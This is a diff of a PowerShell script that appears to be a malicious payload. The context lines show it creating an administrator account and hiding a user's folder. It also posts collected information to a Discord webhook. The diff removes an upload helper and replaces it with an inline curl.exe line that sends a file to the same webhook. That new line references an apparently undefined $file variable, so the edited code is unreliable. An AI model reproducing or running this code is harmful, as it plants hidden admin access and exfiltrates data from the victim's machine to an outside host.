@@ -21,29 +21,6 @@ function createAdmin {
   }
 }
 
-## Sends Infos to Discord Webhook
-function upload_discord {
-
-  [CmdletBinding()]
-  param (
-      [parameter(Position=0,Mandatory=$False)]
-      [string]$file,
-      [parameter(Position=1,Mandatory=$False)]
-      [string]$text 
-  )
-
-  
-  $Body = @{
-    'username' = $env:username
-    'content' = $text
-  }
-  
-  if (-not ([string]::IsNullOrEmpty($text))){
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $Webhook  -Method Post -Body ($Body | ConvertTo-Json)};
-  
-  if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $Webhook}
-  }
-
 ## Temp Directory
 ## variables
 $temp = "$env:temp"
@@ -84,7 +61,7 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 
 ## Sends Discord Webhook
 Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
-upload_discord("$env:computername.fk")
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $Webhook}
 
 
 ## goto Temp and make dir
